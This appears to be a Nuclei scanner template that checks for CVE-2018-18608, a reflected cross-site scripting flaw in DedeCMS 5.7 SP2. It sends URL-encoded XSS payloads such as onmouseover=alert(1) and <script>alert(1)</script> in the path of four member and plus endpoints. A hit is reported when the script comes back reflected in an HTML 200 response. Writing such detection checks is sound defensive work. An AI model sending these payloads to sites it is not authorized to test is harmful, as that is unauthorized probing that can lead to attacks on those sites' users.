id: CVE-2018-18608

info:
  name: DedeCMS V5.7 XSS
  author: ritikchaddha
  severity: medium
  description: DedeCMS 5.7 SP2 allows XSS via the function named GetPageList defined in the include/datalistcp.class.php file that is used to display the page numbers list at the bottom of some templates, as demonstrated by the PATH_INFO to /member/index.php, /member/pm.php, /member/content_list.php, or /plus/feedback.php.
  reference: |
    - https://nvd.nist.gov/vuln/detail/CVE-2018-18608
    - https://github.com/ky-j/dedecms/issues/8
  tags: dedecms,xss,cve,cve2018

requests:
  - method: GET
    path:
      - "{{BaseURL}}/member/index.php/'autofocus/**/onmouseover=alert(1);a=%27%22%3e%22%2f%61%61%61%61%61%61%61%61%61%61%3c%2f%61%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%3c%61%3e?uid=dos1eep&action=guestbook&totalresult=2105&pageno=211))))"
      - "{{BaseURL}}/member/pm.php/'autofocus/**/onmouseover=alert(1);a=%27%22%3e%22%2f%61%61%61%61%61%61%61%61%61%61%3c%2f%61%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%3c%61%3e?uid=dos1eep&action=guestbook&totalresult=2105&pageno=211))))"
      - "{{BaseURL}}/member/content_list.php/'autofocus/**/onmouseover=alert(1);a=%27%22%3e%22%2f%61%61%61%61%61%61%61%61%61%61%3c%2f%61%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%3c%61%3e?uid=dos1eep&action=guestbook&totalresult=2105&pageno=211))))"
      - "{{BaseURL}}/plus/feedback.php/rp4hu%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e?aid=3"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
